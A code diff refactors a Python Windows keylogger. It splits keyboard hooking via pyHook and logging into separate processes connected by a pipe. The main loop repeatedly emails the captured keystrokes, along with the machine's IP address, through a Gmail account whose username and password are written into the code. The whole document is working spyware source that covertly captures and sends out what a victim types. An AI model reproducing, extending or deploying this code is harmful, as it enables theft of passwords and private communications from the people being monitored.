@@ -8,40 +8,34 @@ import sys
 import time
 import urllib2
 import json
+from multiprocessing import Process, Pipe
 
 file_log = r'C:\keylogging\keylog.txt'
 f = open(file_log, 'r+')
+f.seek(0)
+f.truncate()
 last_sent = datetime.datetime.now()
 
-
+#proc 1
 def on_keyboard_event(event):
-    # logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
-    f.write(chr(event.Ascii))
+    global_pipe.send(chr(event.Ascii))
     print(chr(event.Ascii), end="")
-    if get_permission_to_send() and internet_on():
-        global last_sent
-        ip = get_own_ip()
-        f.seek(0)
-        keystrokes = f.read()
-        send_email(ip + '\n' + keystrokes)
-        last_sent = datetime.datetime.now()
-        f.seek(0)
-        f.truncate()
 
     return True
 
-
+#proc 2
 def get_permission_to_send():
     current_time = datetime.datetime.now()
     delta = current_time - last_sent
 
-    with open(file_log) as f:
-        buffer_size = len(f.read())
+    buffer_size = f.tell()
 
-    if delta.seconds > 500 or buffer_size > 500:
+    print('f.tell():', buffer_size)
+    print('DELTA:', delta.seconds)
+    if delta.seconds > 300 or buffer_size > 400:
         return True
 
-
+#proc 2
 def send_email(body):
     username = "n1gh7dev@gmail.com"
     password = "testdev123"
@@ -50,7 +44,10 @@ def send_email(body):
     sender.send(message, username, password)
 
 
-def init_logging():
+#proc 1
+def init_logging(pipe):
+    global global_pipe
+    global_pipe = pipe
     hooks_manager = pyHook.HookManager()
     hooks_manager.KeyDown = on_keyboard_event
     hooks_manager.HookKeyboard()
@@ -63,4 +60,30 @@ if internet_on():
     except:
         pass
 
-init_logging()
+
+if __name__ == '__main__':
+    sender_proc, receiver_proc = Pipe()
+    p = Process(target=init_logging, args=(sender_proc, ))
+    p.start()
+
+    while True:
+        time.sleep(0.2)
+        if receiver_proc.poll():
+            character = receiver_proc.recv()
+            f.write(character)
+            print('received char:', character)
+
+        if get_permission_to_send() and internet_on():
+            ip = get_own_ip()
+            f.seek(0)
+            keystrokes = f.read()
+            send_email(ip + '\n' + keystrokes)
+            last_sent = datetime.datetime.now()
+            f.seek(0)
+            f.truncate()
+
+
+
+
+
+
